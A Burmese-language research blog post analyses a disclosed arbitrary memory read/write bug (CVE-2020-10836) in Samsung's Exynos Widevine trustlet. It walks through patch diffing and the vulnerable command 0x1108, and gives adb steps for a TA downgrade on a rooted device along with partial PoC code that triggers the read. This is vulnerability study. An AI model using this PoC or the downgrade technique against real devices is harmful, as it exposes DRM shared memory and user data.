---
layout: post
title:  "Learning from the old Exynos Trustlet bug (MM)"
date:   2026-01-06 23:35:55 +0630
categories: android exynos
tags: exynos security trustlet vulnerability mm
---
ဒီနေ့တော့ 2020 တုန်းက Disclosure လုပ်ပြီးသား Vulnerability အဟောင်းတခုကို ပြန်လည်လေ့လာမှာဖြစ်ပါတယ်။ Android 8.0 ကနေ Android 10 အတွင်းထိရှိခဲ့တဲ့ Samsung ရဲ့ Exynos PoC သုံးဖုန်းတွေထဲမှာ ပါတဲ့ **Widevine Trustlet** (Trusted Application - TA) တခုထဲမှာ ဖြစ်ပေါ်ခဲ့တဲ့ **Arbitrary Memory Read/Write Vulnerability** တစ်ခုဖြစ်ပါတယ်။ CVE နံပတ် **CVE-2020-10836** (**SVE-2019-15874**) ဖြစ်ပါတယ်။ ဒီ bug က တကယ်တော့ `memcpy` function တခုရဲ့ Source, Destination, Length ၃ ခုလုံးကို attacker စိတ်ကြိုက် ပေးလို့ရနေတဲ့အတွက် **Arbitrary Memory Read/Write** လို့ခေါ်တာဖြစ်ပါတယ်။ **Widevine DRM** ကနေ Hash နဲ့ဆိုင်တဲ့ ကိစ္စတွေလုပ်ဆောင်တဲ့အခါ တက်လာတဲ့ **Hash Error Code Number** ကို Shared Memory ပေါ်ကူးတင်  နိုင်ဖို့အတွက် ပြုလုပ်ထားတဲ့ function တခုရဲ့ bug ပါ။ Widevine ရဲ့ **Shared Memory** ထဲမှာ sensitive user information တွေပါနိုင်တဲ့အတွက် Severity High လို့ ဖော်ပြခဲ့တဲ့ bug တခုပါ။ ဒီ blog မှာတော့ PoC ကို အပြည့်အဝ မဖော်ပြနိုင်ပါဘူး။ ဘာကြောင့်ဆို Android အမြင့်တွေမှာလဲ Downgrade Attack နဲ့ ဒီ bug ကို trigger လုပ်နိုင်နေသေးလို့ပါ။ ကျနော်တော့ Android 13 စက်မှာ TA Downgrade နည်းနဲ့  PoC ရခဲ့ပါတယ်။

> SVE-2019-15873: Arbitrary memory read/write vulnerability in Widevine Trustlet 
> Severity: High
> Affected Versions: O(8.x), P(9.0), Q(10.0) devices with Exynos chipsets
> Reported on: October 11, 2019
> Disclosure status: Privately disclosed.
> A vulnerability caused by “***missing checks of memory address access*”** 
> in Widevine trustlet allows arbitrary memory read and write from 
> non-secure memory.
> The patch ***adds proper range check*** of accessible memory.

## Widevine Trustlet

Widevine Trustlet ဆိုတာက *Netflix, Amazon Prime* စတဲ့ android app တွေအတွက် လိုအပ်တဲ့ DRM နဲ့ Cryptographic ဆိုင်ရာ လုပ်ဆောင်ချက် တွေကို Android System (**Rich Execution Environment - REE**) ထဲမှာ မလုပ်ဆောင်လိုတဲ့ အခါ၊ သူ့ရဲ ပြင်ပဖြစ်တဲ့ ပိုပြီးတော့ လုံခြုံတဲ့ **Trusted Execution Environment(TEE)** တနည်းအားဖြင့် **TrustZone OS** (**Trusted OS**) ထဲမှာ လုပ်ဆောင်ချင်တဲ့အခါမှာ ခေါ်ယူသုံးစွဲကြတဲ့ **Trusted Application (TA)** အမျိုးအစားတခု ဖြစ်ပါတယ်။ **TEE** ဆိုတာက ARM CPU တွေမှာ Hardware အကူအညီနဲ့ သီးခြား သတ်မှတ်ထားတဲ့ လုံခြုံတဲ့ ရပ်ဝန်း Region တခုဖြစ်ပါတယ်။ သူ့ကို **Secure World** လို့လည်း ခေါ်ကြပါတယ်။ ပုံမှန် Android App နဲ့ Android Linux Kernel  တည်ရှိနေတာကတော့ **Normal World** လို့ ခေါ်ကြပါတယ်။

ဘာကြောင့် Trusted OS ထဲမှာ Hardware အကူအညီနဲ့ Cryptograpic ဆိုင်ရာတွေကို လုပ်ဆောင်ကြလဲဆိုတော့ ပုံမှန် Android စနစ်ထဲမှာ attacker တွေက တနည်းနည်းနဲ့ ကြားဖြတ်နားထောင်လို့ မရအောင် ပိုမိုလုံခြုံတဲ့ TEE ထဲကို ပို့ဆောင်ပြီးမှ လုပ်ဆောင်ကြတာဖြစ်ပါတယ်။ အဲ့ဒီထဲမှာ ဘာတွေလုပ်လို့ရသေးလဲဆိုရင် ဖုန်း Lockscreen ဖွင့်တဲ့အချိန် Fingerprint, Face ID, Passcode စတာတွေကို TEE ထဲကို ပို့ဆောင်ပြီးမှ အလုပ်ပြီးမြောက်စေပါသေးတယ်။

![WVDRM_FLOWCHART.drawio.png]({{"/assets/imgs/learning-from-exynos/WVDRM_FLOWCHART.drawio.png" | relative_url}})

![NormalVsSecureWorld.drawio.png]({{"/assets/imgs/learning-from-exynos/NormalVsSecureWorld.drawio.png" | relative_url}})

ဖုန်း Vendor တွေပေါ်မူတည်ပြီးတော့ TrustOS တွေက ကွဲပြားသွားပါတယ်။ Samsung ကတော့ Galaxy S10 မှာ စပြီး TEEGRIS OS ကို စတင်သုံးစွဲလာပြီးတော့ အဲ့မတိုင်ခင်မှာ Trustonic ရဲ့ (Mobicore/Kinibi) TEE OS ကို သုံးစွဲခဲ့ဖူးပါတယ်။ Vulnerabilities တွေ အမြောက်အများပေါ်လာပြီးတဲ့ နောက်မှာ Kinibi ကို စွန့်ပြီး TEEGRIS ကို စတင်သုံးစွဲခဲ့ပါတယ်။ ဒီပို့စ်က TEEGRIS KERNEL ပေါ်မှာ run တဲ့ Widevine Trustlet application အကြောင်းပါ။ TA Image ဖွဲ့စည်းပုံ အကျဥ်းချုံးကို အောက်က section တခုမှာ ရေးပြထားပါတယ်။

## Vulnerability Detail

ပထမဆုံး Android 10.0 ရဲ့  Widevine TA ထဲက Sink လိုက်ရှာကြည့်ခဲ့တယ်။ ရှာခဲ့တဲ့ ပုံစံကတော့ Differenticial Analysis (Patched vs Unpatched) နည်းနဲ့ပါပဲ။ Android 12.0 version TA နဲ့ Android 10.0 TA နှစ်ခုကို Diaphora နဲ့ တိုက်စစ်လိုက်တဲ့ အခါ Android 12.0 မှာ ပြင်ခဲ့တဲ့ Bug ထွက်လာပါတယ်။ 

![Screenshot from 2026-01-02 16-56-38.png]({{"/assets/imgs/learning-from-exynos/Screenshot_from_2026-01-02_16-56-38.png" | relative_url}})

Shared Memory ပေါ်ကို  `memcpy` အသုံးပြုပြီး Hash Error Code ကူးယူတဲ့အဆင့်မှာ  Android 10 တုန်းက `mem_ref_len` parameter ကို attacker အနေနဲ့ ထည့်သွင်းပြီး ခေါ်လို့ရနေပါတယ်။ သဘောကတော့ attacker က ကြိုက်ရာ Length ကို ထည့်ခေါ်လို့ရနေပါတယ်။ Android 10 နောက်ပိုင်းမှသာ Hash Error Code 4 bytes ကိုသာ ပုံသေအနေနဲ့ ကူးယူခွင့်ရတော့မှာပါ။ ဒီနေရာမှာတင် Shared Memory ထဲကို ကြိုက်တဲ့ ပမာဏကူးယူခွင့်ရသွားတာကို Arbitrary Read လို့ သတ်မှတ်လို့ရနိုင်ပါတယ်။ `memcpy` function ရဲ့ destination pointer ဖြစ်တဲ့ mem_ref_buf နဲ့ Length ကို စိတ်ကြိုက်ပေးနိုင်သလိုမျိုးပဲ Source pointer ဖြစ်တဲ့ `_session + 5884`  (သူက Hash Error Code ရှိရာ Pointer) ကို လည်း ကြိုက်ရာပေးလို့ ရပါသေးတယ်။ ဒါကြောင့် ဒီ **CVE Disclosure Detail** မှာ **Arbitrary Read / Write** လို့ ထည့်ရေးထားတာပါ။ နောက် section တခုမှာ ကျနော်တို့ PoC ရေးပြီး Source to Sink ချဥ်းကပ်ကြည့်ပါမယ် ..

![Screenshot from 2026-01-06 11-56-40.png]({{"/assets/imgs/learning-from-exynos/Screenshot_from_2026-01-06_11-56-40.png" | relative_url}})
ပုံမှာ 

1. **mem_ref_buf** က အပြင်ကပို့လိုက်တဲ့ Shared Memory Buffer Pointer.
2. Hash Error Code Number, `liboemcrypto.so` အရဆိုရင် `failed_frame_number` pointer. 
3. mem_ref_len က ကျနော်တို့ သတ်မှတ်လို့ ရတဲ့ buffer length

## Sink To Source Analysis

Vulnerable function တခုတွေ့ပြီဆိုရင် ထို ယိုပေါက်ရှိရာ Sink ကနေ Source အထိကို PoC ရေးဖို့အတွက် လိုက်ဖို့လိုလာပါတယ်။ ခုနက Function ကို ခေါ်သုံးတဲ့ Function တခုချင်းကနေ PoC ရေးပြီး ထို bug ကို ခေါ်နိုင်တဲ့ အဆင့်ထိ တော်လျှောက်လိုက်စစ်တာကို Sink To Source Analysis လို့ခေါ်ကြပါတယ်။ TA တွေကို ခေါ်ယူသုံးတဲ့ အခါမှာ Command ID တွေနဲ့ သုံးကြပါတယ်။ ကျနော်တို့တွေ့တဲ့ `GetHashErrorCode` function က Command ID `0x1108` ပါ။ 

![Screenshot from 2026-01-02 17-03-04.png]({{"/assets/imgs/learning-from-exynos/Screenshot_from_2026-01-02_17-03-04.png" | relative_url}})

> By the way, there are many other bugs existed in the older TA version like pointer leaks for bypassing ASLR, and stack based overflow for code execution and so on…
> 

TA တစ်ခုရဲ့ စစချင်းမှာ Normal World / REE ထဲက Android App သို့မဟုတ် Library တွေက ပို့လိုက်တဲ့ Command ID တွေပေါ် မူတည်ပီး လုပ်ဆောင်ချက်တွေ ကွဲပြားသွားပါတယ်။ ဥပမာ **SHA-256** Hash လုပ်ချင်တဲ့ အခါ Command ID ကို တမျိုးဖြစ်ပါမယ်။ အခု GetHashErrorCode function က Hashing လုပ်နေရင်း တက်တဲ့ Error Code တွေကို Shared Memory ပေါ်ကို ကူးယူပြီးတော့ REE Environment ထဲက `liboemcrypto.so` ကတဆင့် response code ကို ပြန်ပို့တဲ့ သဘောပါ။ ဒီနေရာမှာ Hash Error Code Pointer ဆိုတာက `liboemcrypto.so` က သတ်မှတ်လို့ရတဲ့ pointer တခုပဲ ဖြစ်ပါတယ်။ 

![Screenshot from 2026-01-02 17-03-27.png]({{"/assets/imgs/learning-from-exynos/Screenshot_from_2026-01-02_17-03-27.png" | relative_url}})

TA တခုရဲ့ အစမှာ ဝင်ရောက်လာတဲ့ Command ID တွေကို handle လုပ်တဲ့ Entry Point function တခုရှိပါတယ်။ မည့်သည့် TA version မဆို `TA_InvokeCommandEntryPoint` ပါ။ `handle_cmds` ဟာ Command ID ပေါ်မူတည်ပြီးတော့ TA ထဲဝင်လာတဲ့ Primary Argument နဲ့ Extra Arguments တွေကို သက်ဆိုင်ရာ function တွေကို လုပ်ဆောင် ခိုင်းပါတယ်။ အကယ်၍ Command ID `0x1000` ဆိုရင် တော့ Widevine Trustlet TA ရဲ့ version ကို ပြပါလိမ့်မယ်။

## Preparing for PoC

### Target Trustlet Application: Widevine DRM

TEEGRIS OS အတွက် TA ဖိုင်တွေက များသောအားဖြင့် `/system/tee`  , `/vendor/tee` အောက်မှာ ရှိကြပါတယ်။ သူတို့ဟာ အခြေခံအားဖြင့် ELF Binary File Structure နဲ့ လာပါတယ်။ သူ့ရဲ့ file magic က `SECx` နဲ့ စကြပြီးတော့ `x` နေရာက TA Security Version ပါ။ `SEC3` ကနေ စဖြစ်တော့ TA Version Downgrade ဆင်းလို့မရနိုင်အောင် `RPMB` partition ထဲမှာ TA ရဲ့ current supported version ကို ထည့်မှတ် သိမ်းလာတယ်လို့ ဒီ blog အရ သိခဲ့ရပါတယ်။ [ REFERENCE TO THE BLOG ]

ကျနော်တို့ လက်ရှိ Widevine TA ကတော့ `SEC2` ဆိုတော့ ကျနော်တို့ PoC အတွက် အလုပ်မရှုပ်တော့ဘူးပေါ့ဗျာ .

```bash
$ python ta_info.py SM-A217F_10_00000000-0000-0000-0000-00575644524d
TA Security Version: 2
TA UUID (formatted): 00000000-0000-0000-0000-00575644524d
TA Name: WVDRM
other:  \x01ver. 3.0       descr. WV DRM  \x01\x02\x07\x0flsi_wv
Custom TA Property (first 32 bytes): samsung.ta.cacheHeapSize 
```

TA image တွေရဲ့ naming scheme ကတော့ UUID number တွေကို  *8-4-4-4-12 hex digits (36 chars with hyphens)* အနေနဲ့ သတ်မှတ်ပါတယ်။ အနောက်ဆုံးက 12 hex digits ကို Hex To Char ပြောင်းလိုက်ရင် TA Name အတိုကောက်ရပါတယ် .. ကျနော်တို့ target TA က *00575644524d* ဆိုတော့ **WVDRM** ပါ။ TA ကို Disassemble လုပ်ချင်ရင် ထိပ်ဆုံး 8 bytes (Magic-4 bytes, Timestamp: 4 bytes) ကို ဖျက်ချပြီးတော့ Ghidra, IDA ထဲထည့်လိုက်ရင် ELF အနေနဲ့ parse ပါလိမ့်မယ်။

### OEMCrypto

Android စနစ်ထဲက `liboemcrypto.so` ဆိုတာက DRM နဲ့ Cryptograpic အပိုင်းမှာ Brain လို့ပြောလို့ရပါတယ်။ Android App တွေက `MediaDRM` သို့မဟုတ် `KeyStore` high-level API တွေကို ခေါ်သုံးတဲ့အခါမှာ System Framework တွေက HAL (Hardware Abstraction Layer) သို့မဟုတ် `liboemcrypto.so` တို့လို Vendor Specific Library တွေကို ခေါ်သုံးကြပါတယ်။ သူကနေမှတဆင့် Secure OS ဆီကို `libteecl.so` မှတဆင့် communicate လုပ်ပါတယ်။ အောက်ပါပုံက ကျနော်တို့ရဲ့ TA’s vulnerable function ဖြစ်တဲ့ GetHashErrorCode ကို Command ID `0x1108` နဲ့ လိုအပ်တဲ့ data တွေထည့်ပြီး `teec_communiate` (libteecl.so) function ကို ခေါ်သုံးသွားတာပါ။  

![Screenshot 2026-01-04 at 2.28.41 PM.png]({{"/assets/imgs/learning-from-exynos/Screenshot_2026-01-04_at_2.28.41_PM.png" | relative_url}})

### LibTEECL.so

`libteecl.so` ဆိုတာက Android (Normal World) နဲ့ Secure OS (TEE) ကို ဆက်သွယ်ပေးတဲ့ client library တစ်ခုပါ။ ကျနော်တို့ PoC မှာ main executable က `libteecl` ကို ခေါ်ယူသုံးစွဲမှာပါ။ ဒါမှလည်း TEE ထဲကို ပို့ချင်တဲ့ data တွေပို့လို့ရမှာပါ။ `libteecl` က ပုံမှန်အားဖြစ် TA image တွေကို `/vendor/tee` folder ထဲကပဲ ရှာပြီး load ပါတယ်။ Vulnerable TA က Android 10.0 က TA ဖြစ်ပြီးတော့ ကျနော့် Test Device က Android version 13 ပါ။ Android 13 မှာ Widevine Trustlet TA ရဲ့ ဒီ bug က ပြင်ပြီးသွားပါပြီ။ အဲ့တော့ Vulnerable TA version ကို Android 13 ပေါ်မှာ လှမ်းခေါ်သုံးဖို့ ပြင်ဆင်ရပါတော့မယ်။ ကျနော်တို့က older TA version ကို ခေါ်သုံးမှာဆိုတော့ မူလ `libteecl` ကို ပြုပြင်ဖို့ လိုပါအုံးမယ်။ [ MENTION BLOG POST HERE ]  ပြင်လိုက်တဲ့နောက်မှာ `/data/local/tmp` ထဲက TA ဖိုင်တွေကိုသာ load ပါတော့တယ်။ အောက်ပါ code ကတော့ `libteecl` က TA file ကို `vendor/tee` ထဲက ခေါ်ပြီး UUID Parse လုပ်နေရာပါ။

```c
      v41[36] = 0;
      sub_83B8(3LL, "Trying %s/%s\n", "//vendor/tee", v41);
      v13 = sub_38A4("//vendor/tee", v41); // it will only loads TAs from /vendor/tee directory
      if ( (v13 & 0x80000000) != 0 )
      {
        v13 = -2;
LABEL_15:
        uuid_unparse(v8, v41);
        v19 = strerror(-v13);
        sub_83B8(1LL, "failed to open TA (%s) image: %d (%s)", v41, -v13, v19);
        return v13;
      }
```

tee client library ထဲက လိုအပ်တဲ့ exported symbols တချို့ကို ခေါ်ယူထားပါတယ်။

```c
typedef struct libteecl_handle_t {
    void * lib;

    TEEC_Result (*TEEC_InitializeContext) (const char* name, TEEC_Context* context);
 ...
    TEEC_Result (*TEEC_OpenSession) (TEEC_Context *context,
			     TEEC_Session *session,
			     const TEEC_UUID *destination,
			     uint32_t connectionMethod,
			     const void *connectionData,
			     TEEC_Operation *operation,
			     uint32_t *returnOrigin);
	...
    TEEC_Result (*TEEC_InvokeCommand) (
        TEEC_Session *session,
        uint32_t commandID,
        TEEC_Operation *operation,
        uint32_t *returnOrigin
        );
  ...
    TEEC_Result (*TEEC_RegisterSharedMemory) (
        TEEC_Context *context,
        TEEC_SharedMemory *sharedMem
    );
    TEEC_Result (*TEEC_AllocateSharedMemory) (
        TEEC_Context *context,
        TEEC_SharedMemory *sharedMem
    );
....
```

ဒထဲက အရေးကြီးတဲ့ exported symbols တခုကတော့ `TEEC_InvokeCommand` ။ သူက app ကနေ TA ဆီကို ပို့ဆောင်မယ့် data တွေကို commandID နဲ့ အတူ ပို့ဆောင်ပေးပါတယ်။ TA ဖက်က response ပြန်လာတဲ့ data တွေကိုတော့ `TEEC_SharedMemory` တခုခုထဲမှာ သိမ်းဆည်းပေးပါလိမ့်မယ်။

PoC executable အတွက် Local Privilidge ရှိပြီးသား (Root) ပြီးသား စက်နဲ့ `widevine_tee` ကို ပြင်ထားပြီးသား `libteecl.so` မှတဆင့် Android 10 ရဲ့ `00000000-0000-0000-0000-00575644524d` TA ကို `/data/local/tmp` ထဲ ခေါ်ကြည့်ပါမယ်။

```bash
adb push libs/arm64-v8a/widevine_tee /data/local/tmp
adb shell chmod 755 /data/local/tmp/widevine_tee
adb push libteecl_patched.so /data/local/tmp/libteecl.so
adb shell chmod 755 /data/local/tmp/libteecl.so
adb push SM-A217F_10_00000000-0000-0000-0000-00575644524d /data/local/tmp/00000000-0000-0000-0000-00575644524d
```

### Arbitrary Read Function of the PoC

```c
/*
* arbitrary read via OEMCrypto_GetHashErrorCode (0x1108)
* the memory read of the arbitrary region will be at /dev/tziwshmem
* which is 0x1000 size. It seems like it will be ALWAYS(even with ASLR) at 
[0x0000007ff7ec6000-0x0000007ff7ec7000) rw- /dev/tziwshmem
*/
int arbitrary_read(void* src_addr, size_t length, bool hex_group_dump)
{
    int ret = -1;

    unsigned int session_id = _g_session_id;

    // call GetHashErrorCode function from TA
    tciMessage_custom_t tciMessage;
    memset(&tciMessage, 0, sizeof(tciMessage));
    
    // this is a vulnerable command id
    tciMessage.commandId = 0x1108;
    
    // payload need to be the session id
    memset(tciMessage.payload, 0, sizeof(tciMessage.payload));
    * (uint32_t *)tciMessage.payload = session_id;

    // Allocate buffer for failed_frame_number output
    printf("src_addr at %p\n", src_addr)

    tciExtra_t extraMsg1;
    // this is src ptr
    extraMsg1.ptr = src_addr; // this is where 0xDEADBEEF is created in PoC
    extraMsg1.len = length;
    extraMsg1.flags = 0x11;

    ret = teec_communicate(&tciMessage, &extraMsg1, NULL, NULL);
    if (ret != 0) {
        printf("OEMCrypto_GetHashErrorCode invoke failed ...\n");
        return ret;
    }
    
    if (tciMessage.responseCode != 0) {
        printf("OEMCrypto_GetHashErrorCode returned TA error: 0x%08x\n", tciMessage.responseCode);
        return ret;
    } else {
        printf("g_extraMem1: %p, buffer: %p\n", &g_extraMem1, g_extraMem1.buffer);
            hex_dump_group(
                g_extraMem1.buffer, g_extraMem1.size, 
                0, 8, true
            );
    }
    return ret;
}

....
    u_long src_val = 0xDEADBEEF; // here's our hash error code
    printf("src_val at %p\n", &src_val);
    ret = arbitrary_read(&src_val, 0x200, true); // we put 512 of length for revealing other part of shared mem.
    if (ret != 0) {
        printf("failed to perform arbitrary read ...\n");
        return ret;
    }
....
```

### Command ID 0x1000

ဒါကတော့ Command ID 0x1000 တခုထဲခေါ်ပြီးတော့ TA Version ကို စစ်ထားတာ။

![Screenshot 2026-01-03 at 1.43.34 PM.png]({{"/assets/imgs/learning-from-exynos/Screenshot_2026-01-03_at_1.43.34_PM.png" | relative_url}})

### Command ID 0x1108

ဒါကတော့ `0x1108` ကို **512** length နဲ့ ခေါ်ထားတာ။ Shared Memory တခုလုံးရဲ့ data တွေထွက်လာပါတယ်။ ကျနော်တို့ ထည့်လိုက်တဲ့ Pointer ထဲက **0xDEADBEEF** တန်ဖိုးက Shared Memory ရဲ့ ထိပ်ဆုံးမှာ ရှိနေပြီးတော့ ကျန်တာတွေက Arbitrary Read data တွေပါ။

![Screenshot 2026-01-03 at 2.02.25 PM.png]({{"/assets/imgs/learning-from-exynos/Screenshot_2026-01-03_at_2.02.25_PM.png" | relative_url}})

## Conclusion

ဒါက ကျနော် Exynos iROM (BootROM) နဲ့ ပတ်သက်တဲ့ Research တခုမှာ ပါဝင်ခဲ့တဲ့ PoC တခုပါ။ တကယ်တမ်းတော့ Arbitrary Read/Write Bug တခုထဲနဲ့ TEEGRIS Kernel ထဲထိ ရောက်ဖို့ မလုံလောက်သေးပါဘူး။ တခြား Samsung ရဲ့ disclosed bug တွေဖြစ်တဲ့ Stack-based overflow, Memory Leaks, ASLR bypass, Stack canary bypass တို့နဲ့ပေါင်းပြီး ROP Chain တခု တည်ဆောက်နိုင်တဲ့ထိမှ TEE Kernel ထဲထည့် ရောက်နိုင်မှာပါ။ လောလောဆယ်တော့ ဒီထိပဲ Brain Dump ပါရစေ ..

## References

[Breaking TEE Security 1](https://www.keysight.com/blogs/en/tech/nwvs/2021/02/23/breaking-tee-security-part-1)
[Breaking TEE Security 2](https://www.keysight.com/blogs/en/tech/nwvs/2021/03/12/breaking-tee-security-part-2)
[Breaking TEE Security 3](https://www.keysight.com/blogs/en/tech/nwvs/2021/03/30/breaking-tee-security-part-3)
[THALIUM ARM TrustZone: Pivoting to the Secure World](https://blog.thalium.re/posts/pivoting_to_the_secure_world/)
[QEMU TEEGRIS ARM64](https://github.com/astarasikov/qemu/tree/teegris_arm64_2025-08-19)
[QEMU TEEGRIS TA](https://github.com/astarasikov/qemu/tree/teegris_ta_2024-06-25)
[Awesome Android Security](https://github.com/NetKingJ/awesome-android-security)
[Android Security Exploits YouTube Curriculum](https://github.com/actuator/Android-Security-Exploits-YouTube-Curriculum)
[TEE Knox Cryptography](https://github.com/uv-goswami/Cryptography/blob/main/1.%20Core_Concepts/TEE_Knox.md)
[OffensiveCon22 Federico Menarini and Martijn Bogaard](https://youtu.be/XvmtEwkG_Cc?si=bNdeNneHmW4GHwC3)
[Black Hat Breaking Samsung's Root of Trust](https://youtu.be/BwFtOrkKlbo?si=9fPLp2GVjM4KOgn6)
[https://allsoftwaresucks.blogspot.com/2019/05/reverse-engineering-samsung-exynos-9820.html](https://allsoftwaresucks.blogspot.com/2019/05/reverse-engineering-samsung-exynos-9820.html)
[LibTeec API](https://docs.tizen.org/application/web/api/10.0/device_api/mobile/tizen/libteec.html)
[GlobalPlatform API - OP-TEE](https://optee.readthedocs.io/en/3.18.0/architecture/globalplatform_api.html)
[https://chalkiadakis.me/posts/lakectf23/trust-mee/](https://chalkiadakis.me/posts/lakectf23/trust-mee/)
[https://github.com/enovella/TEE-reversing](https://github.com/enovella/TEE-reversing)
[https://github.com/teesec-research/optee_examples/](https://github.com/teesec-research/optee_examples)
[KeyBuster](https://github.com/shakevsky/keybuster)
